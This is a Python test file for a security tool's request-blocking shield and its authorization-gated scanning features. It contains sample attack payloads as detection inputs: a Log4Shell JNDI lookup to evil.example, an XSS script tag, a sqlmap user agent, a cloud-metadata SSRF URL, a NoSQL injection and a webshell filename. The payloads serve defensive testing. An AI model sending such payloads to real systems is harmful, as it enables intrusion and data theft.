"""
Tests for the hardened offensive/defensive capabilities ("más letal"),
all of which keep the authorization model intact.
"""

# --- Test isolation: runtime data goes to a temporary dir ---
import os
import tempfile
os.environ.setdefault("GOJO_DATA_DIR", tempfile.mkdtemp(prefix="indra_test_"))
os.environ.setdefault("GOJO_ALLOWED_HOSTS", "testserver,127.0.0.1,localhost")
os.environ.pop("GOJO_API_TOKEN", None)
# -----------------------------------------------------------

import asyncio
import unittest

from backend.database import init_db
from core.permissions import ScopeViolationError
from network.ports import PortScanner, TOP_PORTS, RISKY_PORTS, COMMON_PORTS
from techniques.infinity.shield import infinity_shield
from techniques.red.operations import red_operations


class TestLethalDefense(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        init_db()

    def setUp(self):
        infinity_shield.failed_attempts.clear()
        infinity_shield.offense_history.clear()

    def test_critical_signature_bans_on_first_hit(self):
        ip = "198.51.100.10"
        infinity_shield.unban_ip(ip)
        allowed, _, block = infinity_shield.inspect_request(
            ip, "/", "GET", query_string="x=${jndi:ldap://evil.example/a}"
        )
        self.assertFalse(allowed)
        self.assertEqual(block, "LOG4SHELL_JNDI_PROBE")
        self.assertTrue(infinity_shield.is_ip_banned(ip))
        infinity_shield.unban_ip(ip)

    def test_scanner_user_agent_is_contained_fast(self):
        ip = "198.51.100.11"
        infinity_shield.unban_ip(ip)
        # A medium XSS probe would normally need several hits, but the sqlmap UA triggers containment.
        allowed, _, _ = infinity_shield.inspect_request(
            ip, "/", "GET", query_string="q=<script>alert(1)</script>",
            headers={"user-agent": "sqlmap/1.7"},
        )
        self.assertFalse(allowed)
        self.assertTrue(infinity_shield.is_ip_banned(ip))
        infinity_shield.unban_ip(ip)

    def test_ban_duration_escalates(self):
        ip = "198.51.100.12"
        self.assertEqual(infinity_shield._escalated_ban_minutes(ip), 30)
        infinity_shield.offense_history[ip] = 1
        self.assertEqual(infinity_shield._escalated_ban_minutes(ip), 120)
        infinity_shield.offense_history[ip] = 99
        self.assertEqual(infinity_shield._escalated_ban_minutes(ip), 10080)

    def test_loopback_never_auto_banned_even_on_critical(self):
        infinity_shield.inspect_request(
            "127.0.0.1", "/", "GET", query_string="x=${jndi:ldap://evil/a}"
        )
        self.assertFalse(infinity_shield.is_ip_banned("127.0.0.1"))

    def test_new_signatures_detected(self):
        samples = {
            "SSRF_METADATA_PROBE": "url=http://169.254.169.254/latest/meta-data/",
            "NOSQL_INJECTION": 'user[$ne]=1',
            "WEBSHELL_UPLOAD": "file=shell.php",
        }
        for expected, payload in samples.items():
            allowed, _, block = infinity_shield.inspect_request(
                "203.0.113.200", "/", "GET", query_string=payload
            )
            self.assertFalse(allowed, payload)
            self.assertEqual(block, expected)
            infinity_shield.unban_ip("203.0.113.200")
            infinity_shield.failed_attempts.clear()
            infinity_shield.offense_history.clear()


class TestLethalOffense(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        init_db()

    def test_top_ports_superset_and_risky(self):
        self.assertTrue(set(COMMON_PORTS).issubset(set(TOP_PORTS)))
        self.assertGreater(len(TOP_PORTS), len(COMMON_PORTS) + 50)
        self.assertIn(3306, RISKY_PORTS)
        self.assertIn(6379, RISKY_PORTS)

    def test_banner_version_extraction(self):
        self.assertIn("OpenSSH", PortScanner.extract_version("SSH-2.0-OpenSSH_8.9p1 Ubuntu"))
        self.assertIn("nginx", PortScanner.extract_version("HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\n").lower())
        self.assertIsNone(PortScanner.extract_version(""))

    def test_deep_audit_requires_authorization(self):
        with self.assertRaises(ScopeViolationError):
            asyncio.run(red_operations.deep_web_audit("http://scanme.example.org"))

    def test_sensitive_paths_require_authorization(self):
        with self.assertRaises(ScopeViolationError):
            asyncio.run(red_operations.probe_sensitive_paths("http://scanme.example.org"))


if __name__ == "__main__":
    unittest.main()
